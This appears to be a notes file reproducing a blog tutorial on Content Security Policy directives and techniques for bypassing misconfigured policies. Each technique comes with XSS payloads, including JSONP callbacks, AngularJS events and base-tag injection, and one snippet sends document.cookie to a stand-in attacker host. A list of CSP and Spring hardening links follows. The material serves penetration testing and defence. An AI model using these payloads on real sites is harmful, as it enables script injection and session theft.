
##
#
https://www.cobalt.io/blog/csp-and-bypasses
https://0xn3va.gitbook.io/cheat-sheets/web-application/content-security-policy
#
##

Content Security Policy (CSP) is a W3C standard that allows developers to control resource loading and execution of certain types of scripts in a web application. It is designed to increase web applications' security and protect users from XSS (Cross-Site Scripting) attacks.

This blog post aims to demonstrate what CSP is and why CSP is implemented. And how attackers can bypass CSP. In this article, I will include how you can bypass some directives to achieve XSS on the target application.

 

What is CSP?
CSP stands for Content Security Policy, which defines what resources can be retrieved and executed by a web page. Another way to understand it is by determining which scripts, images, and iframes can be called or run on a specific page from different online locations. A few exceptions include server origins and script endpoints. HTTP response headers or meta elements are used to implement Content Security Policy.

 

Why is Implementing CSP Essential?
To prevent attacks such as cross-site scripting (XSS), CSP technology is built into most browsers as a built-in technology. Clickjacking can be prevented more efficiently than using X-Frame-Options headers by using proper CSP. Therefore, you should use CSP to protect your website against clickjacking attacks. However, if you want to protect older browsers that do not support CSP, you can combine this with the X-Frame-Options header. 

For example, input validation may protect a website from injection attacks, but attackers may still craft unique payloads to bypass it. As a result, CSP does not represent your first line of defense but your defense in depth.

Even when the validation checks are bypassed, CSP blocks script execution from an unintended source neutralizing the attack to much extent.

 

CSP Directives
When implementing CSP, we must understand different policy directives we can use. Let’s take a look at some of them.

script-src: Specifies the JavaScript sources that are allowed. Additionally, inline script event handlers (onclick) and XSLT stylesheets (eXtensible Stylesheet Language) that trigger script execution can also be loaded into elements.

default-src: This directive specifies how resources are fetched by default. The browser follows this directive if fetch directives are not included in the CSP header.

child-src: This directive specifies what resources web workers and embedded frames can use.

frame-src: This directive limits the URLs that can be called out as frames.

frame-ancestors: A directive specifies the sources where this page can be embedded. It applies only to non-HTML resources and can't be used in tags(used to prevent clickjacking attacks).

img-src: This specifies which sources can be used to load images on the web page.

object-src: This property defines the allowed sources for the elements object, embed, and widget.

base-uri: With this element, you can define the allowed URLs for an element to load using.

upgrade-insecure-requests: By using this directive, browsers are instructed to rewrite URL schemes so that HTTP is replaced by HTTPS. Rewriting old URLs can be beneficial for websites with many old URLs.

sandbox: The sandbox (document) directive creates a sandbox around the resource, similar to the sandbox attribute. As a result, popups are prevented, plugins and scripts are prohibited, and a same-origin policy is enforced.

Some other CSP directives include: prefetch-src, connect-src, form-action, etc.

 

Values for CSP Directives 
*: Except for data: blob: filesystem schemes, any URL can be used.
none: No sources are allowed to be loaded in this case.
self: A source that defines that resources from the same domain are permitted to be loaded.
data: Load resources using the data scheme (e.g. Base64 encoded images)
unsafe-eval: This allows you to create code from strings using eval() and window.execScript. This source should not be included in any directives. That's why it's called unsafe.
unsafe-hashes: Use this to enable specific event handlers inline.
unsafe-inline: This allows using inline resources, such as inline elements, javascript: URLs, and inline event handlers. For security reasons, this is not recommended.
nonce: An inline script whitelist that uses a cryptographic nonce (number used once). A nonce value must be unique and generated each time the server transmits a policy.
sha256-<hash>: The script has to have a specific SHA256 hash to be whitelisted.
To validate the CSP of your application, check out CSP Evaluator by Google.



Unsafe Policies
 
Wildcard(*)
CSP Header

Content-Security-Policy: script-src 'self' https://cobalt.io https: data *; 

In script-src, a wildcard is used, which results in a misconfigured CSP policy.

XSS payloads:

<script src="data:text/javascript,alert(document.domain)"></script>

<script src=https://cobalt.io/evil.js></script>

 

Unsafe eval()
CSP Header

Content-Security-Policy: script-src https://cobalt.io 'unsafe-eval' data: http://*;

This policy remains vulnerable due to unsafe-eval usage despite having the script source set to https://www.cobalt.io.

XSS payloads:

<script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>

 

Unsafe inline
CSP Header

Content-Security-Policy: script-src ‘self’  'unsafe-inline' ;

Despite this policy requiring scripts from the Cobalt.io site, it is vulnerable because the directive uses unsafe-inline.

XSS payloads:

<script>alert(domain);</script>

<Svg OnLoad=alert(domain)>

Example:

Notice that a normal <tag eventhandler=js> will work if unsafe-inline is implemented.

Here we can see the above CSP header is implemented.



Using the payload mentioned above, we can achieve XSS vulnerability.



JSONP Callback and Whitelisted the Third Party
In JSONP, the same-origin policy (SOP) is bypassed so you can request and retrieve data from a server without worrying about cross-domain issues.

JavaScript payloads can be injected into JSONP endpoints through GET parameters called "callbacks", and the endpoint will return them to you as JSON, bypassing SOP(same origin policy). For example, we can send our JavaScript payload via the JSONP endpoint. Below is an example:

https://accounts.google.com/o/oauth2/revoke?callback=alert(1)



The script-src policy can cause problems if a header has one of these endpoints whitelisted. The JSONP endpoint would allow us to bypass the CSP policy by loading our malicious JavaScript.
There are a number of ready-to-use CSP bypass endpoints available in JSONBee.

CSP header

script-src https://www.google.com https://accounts.google.com;

The following payload would be loaded because accounts.google.com allows JavaScript files to be loaded. To load our malicious JavaScript, we are abusing the JSONP feature.

XSS payloads:

cobalt.io?vuln_param=https://accounts.google.com/o/oauth2/revoke?callback=alert(1)

 

Lack of object-src and default-src
CSP header

Content-Security-Policy: script-src 'self' ;

<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>

 

">'><object type="application/x-shockwave-flash" data='https: //ajax.googleapis.com/ajax/libs/yui/2.8.0 r4/build/charts/assets/charts.swf?allowedDomain=\"})))}catch(e) {alert(1337)}//'><param name="AllowScriptAccess" value="always"></object>

 

Angular JS
The CSP policy can be bypassed if the AngularJS application loads any scripts from a whitelisted domain. To accomplish this, a callback function and vulnerable class must be called. In addition, a special $event object is defined for AngularJS events, which simply refers to the browser event object. Through this object, you can bypass the CSP.

CSP header

Content-Security-Policy: script-src 'self' ajax.googleapis.com; object-src 'none' ;report-uri /Report-parsing-url;

XSS payloads:

ng-app"ng-csp ng-click=$event.view.alert(1337)><script src=//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js></script>

"><script src=//ajax.googleapis.com/ajax/services/feed/find?v=1.0%26callback=alert%26context=1337></script>

 

File Upload
You can bypass the CSP if you can upload a JS file. There is a high probability that the server validates the uploaded file and allows only the specified file types to be uploaded.

In addition, even if you upload JS code into a file with an extension accepted by the server (e.g. script.png if png extension is allowed), this won't suffice because some servers, like the apache server, determine the MIME type of the file based on its extension. Chrome browser, for example, rejects Javascript code running in an image.

CSP header

Content-Security-Policy: script-src 'self';  object-src 'none' ;

XSS payloads:

‘“><script src="/uploads/csp.js"></script>

 

Whitelisted Scheme
CSP header

Content-Security-Policy: script-src data: ;

XSS payloads:

<script%20src=data:text/javascript,alert(1337)></script>

Here we can notice the above CSP header is implemented.



After submitting the above payload, we can achieve XSS, bypassing the CSP.



base-uri Bypass
A dangling markup injection can be performed if the base-uri directive is absent in the defined CSP. You can abuse the base tag to obtain an XSS by making the page load a script from your server if the script has a relative path (like /js/app.js). An HTTPS URL should be used if the vulnerable page is loaded over HTTPS.

CSP header

Content-Security-Policy: script-src 'nonce-abcd1234';

XSS payloads:

<Base Href=//X55.is>

We can notice that a CSP header is implemented like we discussed above.



After submitting the above payload, we get the xss,



Folder path bypass
When you use the %2f to encode '/' as part of your CSP policy and point it to a folder, it will still be considered part of the folder. That seems to be the case with almost all modern-day browsers.

When the server decodes it, it can be bypassed by using "%2f..%2f",  bypassing the folder restriction. For example, you can access http://example.com/company/, and executing http://example.com/company%2f..%2fattacker/file.js will bypass the restriction.

CSP header: 

Content-Security-Policy: script-src cobalt.io/safe-directory/

XSS payloads:

<script src="https://<abc>.com/safe-directory%2f..%2f/abc/unsafe-directory"></script> 

Bypassing CSP using IFRAME
Attackers can use Iframes to bypass the below CSP policy. An iframe from the whitelisted domain must be allowed by the application in order to perform the bypass. An XSS attack can be easily facilitated by using the srcdoc attribute of the iframe.

CSP header

Content-Security-Policy: default-src 'self' data: *; connect-src 'self'; script-src  'self' ; 

XSS payloads:

<iframe srcdoc='<script src="data:text/javascript,alert(document.domain)"></script>'></iframe>

<iframe src='data:text/html,<script defer="true" src="data:text/javascript,document.body.innerText=/hello/"></script>'></iframe>

CSP Injection Bypass
In this case, the input from the user is reflected back in the CSP header. Let's take the following URL as an example:

https://www.cobalt.io?param=payload.

This is what you should see if your input is reflected in the CSP header.

CSP header

script-src payload;

object-src 'none';

base-uri 'none';

script-src can therefore be set to whatever value we want. This value can be easily set to a domain we control, bypassing the CSP.

CSP Data Exfiltration
Even though there’s a strict CSP that prohibits you from interacting with external servers, there are still things you can do to exfiltrate the data regardless of how strict the CSP is.

Location 

In order to send the secret information to the attacker's server, you could simply update the location:

var sessionid = document.cookie.split('=')[1] + "."; 

document.location = "https://www.attacker-owned-website.com/?" + sessionid;

Conclusion
CSP serves as a defense-in-depth strategy against XSS and clickjacking attacks. CSP can, however, be easily bypassed if not implemented properly. Therefore, it is ideal for all scripts to reside on your hosts, and your CSP should not allow anything from the internet.

We hope you enjoyed this blog post. See you again in our next blog post.

Reference
https://brutelogic.com.br/blog/csp-bypass-guidelines/
https://bhavesh-thakur.medium.com/content-security-policy-csp-bypass-techniques-e3fa475bfe5d
https://book.hacktricks.xyz/pentesting-web/content-security-policy-csp-bypass

##
##

##
##
##

<3

https://developers.google.com/web/fundamentals/security/csp
<br>
<br>
Spring_v_XSS
<br>
https://www.baeldung.com/spring-prevent-xss
<br>
https://www.stackhawk.com/blog/spring-content-security-policy-guide-what-it-is-and-how-to-enable-it/
<br>
https://phani-susarla.medium.com/preventing-xss-in-spring-boot-apps-558580340f33

<br>
https://stackoverflow.com/questions/30280370/how-does-content-security-policy-csp-work
<br>
Bypasses
<br>
https://blog.detectify.com/2019/07/11/content-security-policy-csp-explained-including-common-bypasses/
<br>

CONTENT-SECURITY-POLICY NONCE WITH SPRING SECURITY
<br>
https://techblog.bozho.net/content-security-policy-nonce-with-spring-security/
<br>

https://github.com/nico3333fr/CSP-useful
<br>

https://github.com/paragonie/csp-builder


<br>
Adding CSP Header
https://github.com/apache/zeppelin/pull/3141/files
<br>

GitHub Case Study
https://github.blog/2016-04-12-githubs-csp-journey/


